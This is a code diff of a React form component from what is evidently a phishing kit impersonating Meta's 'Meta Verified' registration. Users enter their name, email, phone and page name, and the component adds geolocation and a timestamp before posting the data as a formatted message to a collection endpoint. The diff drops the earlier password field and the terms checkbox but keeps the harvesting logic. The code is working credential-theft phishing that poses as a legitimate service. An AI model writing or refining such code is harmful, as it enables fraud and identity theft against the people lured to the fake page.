@@ -1,8 +1,6 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
-import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
-import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
@@ -14,6 +12,7 @@ import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useM
 interface FormData {
     fullName: string;
     personalEmail: string;
+    pageName: string;
 }
 
 interface FormField {
@@ -24,20 +23,18 @@ interface FormField {
 
 const FORM_FIELDS: FormField[] = [
     { name: 'fullName', label: 'Full Name', type: 'text' },
+    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' }
 ];
-const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
-    const [password, setPassword] = useState('');
-    const [showPassword, setShowPassword] = useState(false);
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
-        personalEmail: ''
+        personalEmail: '',
+        pageName: ''
     });
-    const [agree, setAgree] = useState(false);
-    const [showAgreeError, setShowAgreeError] = useState(false);
 
     const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
@@ -48,7 +45,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Mobile phone number', 'Password', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -88,13 +85,10 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
-        setShowAgreeError(false);
-        if (!agree) {
-            setShowAgreeError(true);
-            return;
-        }
+
         if (isLoading) return;
         setIsLoading(true);
+
         const message = `
 ${
     geoInfo
@@ -103,12 +97,13 @@ ${
 }
 
 <b>👤 Full Name:</b> <code>${formData.fullName}</code>
+<b>📘 Page Name:</b> <code>${formData.pageName}</code>
 <b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
 <b>📱 Phone Number:</b> <code>${phoneNumber}</code>
-<b>🔒 Password:</b> <code>${password}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
         `.trim();
+
         try {
             const res = await axios.post('/api/send', {
                 message
@@ -117,17 +112,20 @@ ${
                 setMessageId(res.data.data.result.message_id);
                 setMessage(message);
             }
-            nextStep();
         } catch {
-            nextStep();
+            // Continue even if send fails
         } finally {
             setIsLoading(false);
+            nextStep(formData);
         }
     };
 
     return (
-        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
-            <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
+        <>
+            {/* Overlay mờ toàn màn hình */}
+            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
+            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-2 md:px-4'>
+                <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                 <div className='mb-2 flex w-full items-center justify-between p-2 md:p-4 pb-0'>
                     <p className='text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
                     <button type='button' onClick={() => setModalOpen(false)} className='h-8 w-8 rounded-full transition-colors hover:bg-[#e2eaf2]' aria-label='Close modal'>
@@ -152,34 +150,6 @@ ${
                                 className: 'h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base'
                             }}
                         />
-                        <p className='font-sans'>{t('Password')}</p>
-                        <div className='relative w-full mb-2'>
-                            <input
-                                type={showPassword ? 'text' : 'password'}
-                                value={password}
-                                onChange={e => {
-                                    setPassword(e.target.value);
-                                }}
-                                className='h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10 text-sm md:text-base'
-                                required
-                                autoComplete='new-password'
-                            />
-                            <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
-                        </div>
-                        <div className='flex flex-col items-start gap-1 pt-2'>
-                            <div className='flex items-center gap-2'>
-                                <input
-                                    type='checkbox'
-                                    className='cursor-pointer'
-                                    checked={agree}
-                                    onChange={e => setAgree(e.target.checked)}
-                                />
-                                <p className='cursor-pointer'>{t('I agree with Terms of use')}</p>
-                            </div>
-                            {showAgreeError && (
-                                <span className='text-xs text-red-600'>{t('You must agree to the terms to continue.')}</span>
-                            )}
-                        </div>
                         <button type='submit' disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                         </button>
@@ -190,7 +160,8 @@ ${
                     <Image src={MetaLogo} alt='' className='h-4.5 w-17.5' />
                 </div>
             </div>
-        </div>
+            </div>
+        </>
     );
 };
 
